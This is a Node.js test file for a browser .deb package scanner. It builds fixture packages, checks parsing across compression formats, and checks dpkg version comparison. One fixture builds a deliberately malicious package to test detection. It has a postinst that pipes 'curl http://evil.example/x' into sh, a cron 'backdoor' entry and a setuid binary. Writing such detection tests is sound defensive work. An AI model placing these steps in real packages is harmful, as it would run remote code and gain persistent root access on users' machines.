/* Node test for the browser deb parser. Builds fixture .debs with dpkg-deb
 * and decompresses with the same vendored pure-JS libraries the page uses
 * (fzstd / bz2 / LZMA-JS), plus node:zlib for gzip and system xz.
 *
 * Run: node --test test/
 * Requires: dpkg-deb, gzip, xz, bzip2 (Debian/Ubuntu: apt install dpkg xz-utils bzip2)
 * (dpkg-deb can only build gzip/xz/zstd/none, so bz2/lzma fixtures are
 *  produced by re-packing the ar archive with a CLI-compressed data.tar.)
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, chmodSync } from "node:fs";
import { gunzipSync } from "node:zlib";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { parseDeb, compareDebVersions, extractEmail, loginFromNoreply } from "../site/debparse.js";
import { decompress as fzstdDecompress } from "../site/vendor/fzstd.js";
import { decompress as bz2Decompress } from "../site/vendor/bz2.js";
import { LZMA } from "../site/vendor/lzma-d.js";

const sh = (cmd, args, input) => new Uint8Array(execFileSync(cmd, args, { input, maxBuffer: 1 << 28 }));

// Same code paths the browser runs (see site/app.js), minus DecompressionStream.
const decompressors = {
  gzip: async (d) => new Uint8Array(gunzipSync(d)),
  xz: async (d) => sh("xz", ["-dc"], d),
  zstd: async (d) => fzstdDecompress(d),
  bzip2: async (d) => bz2Decompress(d),
  lzma: async (d) => new Promise((resolve, reject) => {
    LZMA.decompress(d, (out, err) => (err
      ? reject(new Error(String(err)))
      : resolve(typeof out === "string" ? new TextEncoder().encode(out) : new Uint8Array(out))));
  }),
};

/* dpkg-deb only builds gzip/xz/zstd/none, so legacy bz2/lzma debs are made by
 * rebuilding the ar archive around a CLI-compressed data.tar member. */

function parseArEntries(bytes) {
  const dec = new TextDecoder();
  const entries = [];
  let off = 8;
  while (off + 60 <= bytes.length) {
    const name = dec.decode(bytes.subarray(off, off + 16)).trim();
    const size = parseInt(dec.decode(bytes.subarray(off + 48, off + 58)).trim(), 10);
    entries.push({ name, data: bytes.subarray(off + 60, off + 60 + size) });
    off += 60 + size + (size % 2);
  }
  return entries;
}

function buildAr(entries) {
  const enc = new TextEncoder();
  const parts = [enc.encode("!<arch>\n")];
  for (const { name, data } of entries) {
    const header = name.padEnd(16) + "0".padEnd(12) + "0".padEnd(6) + "0".padEnd(6) +
      "100644".padEnd(8) + String(data.length).padEnd(10) + "`\n";
    parts.push(enc.encode(header), data);
    if (data.length % 2) parts.push(enc.encode("\n"));
  }
  return Buffer.concat(parts);
}

/** Recompress the data.tar member with bzip2 or lzma (control.tar stays raw,
 *  which also exercises the uncompressed ".tar" path). */
function repackDeb(debPath, compression) {
  const [cmd, args, ext] = compression === "bzip2"
    ? ["bzip2", ["-c"], ".bz2"]
    : ["xz", ["--format=lzma", "-c"], ".lzma"];
  const entries = parseArEntries(new Uint8Array(readFileSync(debPath)));
  const out = entries.map(({ name, data }) =>
    name === "data.tar" ? { name: `data.tar${ext}`, data: sh(cmd, args, data) } : { name, data });
  writeFileSync(debPath, buildAr(out));
  return debPath;
}

function buildDeb({ name, version, maintainer, evil = false, compression = "xz" }) {
  const root = mkdtempSync(join(tmpdir(), "debfix-"));
  const stage = join(root, "stage");
  mkdirSync(join(stage, "DEBIAN"), { recursive: true });
  mkdirSync(join(stage, "usr/share/APPLaunch/applications"), { recursive: true });
  mkdirSync(join(stage, "usr/share/APPLaunch/bin"), { recursive: true });
  mkdirSync(join(stage, "usr/share/APPLaunch/share/images"), { recursive: true });

  writeFileSync(join(stage, "DEBIAN/control"),
    `Package: ${name}\nVersion: ${version}\nArchitecture: arm64\n` +
    `Maintainer: ${maintainer}\nDescription: test fixture\n`);
  writeFileSync(join(stage, `usr/share/APPLaunch/applications/${name}.desktop`),
    `[Desktop Entry]\nName=Fixture App\nExec=/usr/share/APPLaunch/bin/${name}\n` +
    `Terminal=false\nIcon=share/images/${name}.png\nType=Application\n`);
  // Tiny valid PNG (1x1)
  const png = Buffer.from(
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==",
    "base64");
  writeFileSync(join(stage, `usr/share/APPLaunch/share/images/${name}.png`), png);
  writeFileSync(join(stage, `usr/share/APPLaunch/bin/${name}`), "#!/bin/sh\necho hi\n");
  chmodSync(join(stage, `usr/share/APPLaunch/bin/${name}`), 0o755);

  if (evil) {
    writeFileSync(join(stage, "DEBIAN/postinst"), "#!/bin/sh\ncurl http://evil.example/x | sh\n");
    chmodSync(join(stage, "DEBIAN/postinst"), 0o755);
    mkdirSync(join(stage, "etc/cron.d"), { recursive: true });
    writeFileSync(join(stage, "etc/cron.d/backdoor"), "* * * * * root /usr/share/APPLaunch/bin/x\n");
    chmodSync(join(stage, `usr/share/APPLaunch/bin/${name}`), 0o4755); // setuid
  }

  const out = join(root, `${name}_${version}_arm64.deb`);
  const legacy = compression === "bzip2" || compression === "lzma";
  execFileSync("dpkg-deb", ["--root-owner-group", `-Z${legacy ? "none" : compression}`, "-b", stage, out],
    { stdio: "pipe" });
  return legacy ? repackDeb(out, compression) : out;
}

test("parses a clean package (xz)", async () => {
  const deb = buildDeb({
    name: "fixture", version: "1.2.3",
    maintainer: "Dev <dev@users.noreply.github.com>",
  });
  const r = await parseDeb(readFileSync(deb), decompressors);
  assert.equal(r.control.Package, "fixture");
  assert.equal(r.control.Version, "1.2.3");
  assert.equal(r.email, "dev@users.noreply.github.com");
  assert.equal(r.desktop.Name, "Fixture App");
  assert.ok(r.icon && r.icon.isPng);
  assert.equal(r.verdict, "pass");
});

test("parses every compression deb(5) allows", async () => {
  // gzip/xz/zstd via dpkg-deb; none via -Znone; bzip2/lzma via ar repack
  // (their control.tar stays uncompressed, covering the raw ".tar" path too).
  for (const compression of ["gzip", "zstd", "none", "bzip2", "lzma"]) {
    const deb = buildDeb({
      name: "fixture", version: "1.0.0",
      maintainer: "Dev <dev@users.noreply.github.com>", compression,
    });
    const r = await parseDeb(readFileSync(deb), decompressors);
    assert.equal(r.control.Package, "fixture", compression);
    assert.equal(r.verdict, "pass", compression);
    assert.ok(r.icon && r.icon.isPng, compression);
  }
});

test("flags malicious content", async () => {
  const deb = buildDeb({
    name: "sketchy", version: "0.1",
    maintainer: "X <x@users.noreply.github.com>", evil: true,
  });
  const r = await parseDeb(readFileSync(deb), decompressors);
  const msgs = r.report.map(([, m]) => m).join("\n");
  assert.equal(r.verdict, "danger");
  assert.match(msgs, /下载并直接执行代码/);
  assert.match(msgs, /setuid/);
  assert.match(msgs, /非常规安装路径.*cron/);
});

test("dpkg version semantics", () => {
  assert.equal(compareDebVersions("1.0.4", "1.0.3"), 1);
  assert.equal(compareDebVersions("1.0.3", "1.0.3"), 0);
  assert.equal(compareDebVersions("1.0~beta", "1.0"), -1);
  assert.equal(compareDebVersions("1.0-m5stack2", "1.0-m5stack1"), 1);
  assert.equal(compareDebVersions("2:0.1", "1:9.9"), 1);
  assert.equal(extractEmail("A B <a@b.c>"), "a@b.c");
});

test("loginFromNoreply extracts owner login for ownership attribution", () => {
  assert.equal(loginFromNoreply("Dev <dev@users.noreply.github.com>"), "dev");
  assert.equal(loginFromNoreply("Some One <12345+someone@users.noreply.github.com>"), "someone");
  assert.equal(loginFromNoreply("EGG <EGG@users.noreply.github.com>"), "egg");
  // Non-noreply (real) emails are not attributable to a login.
  assert.equal(loginFromNoreply("Real <real@example.com>"), "");
  assert.equal(loginFromNoreply(""), "");
});
